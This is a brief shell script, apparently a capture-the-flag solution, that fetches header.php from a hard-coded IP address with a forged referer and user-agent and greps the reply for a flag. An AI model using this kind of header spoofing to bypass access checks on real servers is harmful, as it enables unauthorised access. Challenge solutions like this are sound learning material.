#!/bin/sh

referer='awesomesauce.com'
user_agent='Sup3rS3cr3tAg3nt'
endpoint='http://165.227.106.113/header.php'

curl -sL -A $user_agent -e $referer $endpoint | grep -io flag{.*}
